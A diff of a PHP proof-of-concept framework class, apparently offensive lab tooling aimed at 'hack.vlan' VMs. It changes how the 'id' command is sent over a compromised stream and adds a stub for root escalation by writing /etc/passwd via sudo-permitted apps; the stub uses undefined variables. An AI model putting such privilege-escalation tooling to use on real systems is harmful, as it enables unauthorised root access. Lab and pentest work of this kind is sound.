@@ -100,7 +100,7 @@ class poc4lan extends poc4web {
             $templateB64_shell = base64_encode($template_shell);
             
             $data = "id";
-            $rst_id = $test->stream4result($stream, $data, 10);
+            $rst_id = $test->req_str($stream, $data, 10,"");
             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id8str) = $test->parse4id($rst_id);
             $id8b64 = base64_encode($id8str);
             $this->article("CREATE Template ID", $template_id);
@@ -163,6 +163,22 @@ class poc4lan extends poc4web {
         
     }
     
+    public function poc4root8users2sudoers8app2write8cat2etc_passwd(){
+        $this->ssTitre(__FUNCTION__);
+        $eth = 'vmnet6';
+        $domain = 'hack.vlan';
+        
+  
+        
+        $login = "";
+        $pass = "";
+        $titre = "";
+        $fonction2exec = "";
+        $vm = "";
+        $this->poc4root($eth,$domain,$ip,$port,$protocol,$login,$pass,$titre,$fonction2exec,$vm);
+        
+        
+    }
     
     public function poc4root8users2sudoers8app2write8cp2etc_passwd(){
         $this->ssTitre(__FUNCTION__);
@@ -571,7 +587,7 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
             $templateB64_cmd = base64_encode($template_cmd);
             
             $data = "id";
-            $rst_id = $test->stream4result($stream, $data, 10);
+            $rst_id = $test->req_str($stream, $data, 10,"");
             list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $test->parse4id($rst_id);
             $id8b64 = base64_encode($id);
             $this->article("CREATE Template ID", $template_id);
